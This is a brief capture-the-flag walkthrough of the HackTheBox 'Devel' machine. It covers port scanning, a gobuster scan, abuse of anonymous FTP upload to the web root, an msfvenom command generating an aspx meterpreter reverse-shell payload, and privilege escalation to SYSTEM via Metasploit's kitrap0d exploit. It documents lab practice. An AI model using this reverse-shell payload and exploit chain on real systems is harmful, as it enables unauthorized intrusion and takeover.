```md

[*] Walkthrough For Devel On HackTheBox

[+] Scanning And Emumeration

[+] Open Ports

80/tcp
21/tcp

[*] Found Default Webpage

[+] Directory Listing Using Gobuster

gobuster dir -u <http://IP> -w <Path To Wordlist>

[*] Found FTP Anonymous Login Allowed
[*] FTP Was The Directory For The Web Server!

[*] Tried To Add A File. Successful!
[*] Added RevShell Payload Using msfvenom In aspx Format. 

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP> LPORT=4444 -f aspx > File.aspx

[*] Got A Shell By Navigating To The Directory. (Used msfconsole. exploit/multi/handler)

http://<IP>/File.aspx

[-] We Are NOT Authority System!
[*] Background The Session

[*] Used post/multi/recon/local_exploit_suggester For Finding PrivEsc. 
[*] Used exploit/windows/local/ms10_015_kitrap0d
[*] Got A Shell

[*] Authority-System!

[*] Done!
